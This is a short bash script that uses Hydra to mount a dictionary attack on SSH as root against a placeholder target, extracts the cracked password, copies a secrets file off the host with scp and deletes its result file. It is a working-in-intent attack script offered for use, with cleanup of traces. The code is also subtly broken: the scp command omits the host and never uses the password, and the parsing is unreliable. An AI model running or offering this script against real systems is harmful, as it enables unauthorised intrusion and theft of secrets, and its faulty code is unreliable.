#!/bin/bash

# Store the target host information
host=<target_host_ip>
port=22
username=root
secrets_file=~/sensitive-info.txt

# Use Hydra to launch a dictionary attack against the target host
hydra -l $username -P passwd $host ssh > result.txt

# Extract the password from the result of the Hydra attack
password=$(grep "password:" result.txt | awk '{print $2}')

# Use the extracted password to log in to the target host and retrieve the secrets file
scp $username:$secrets_file .

# Clean up the result file
rm result.txt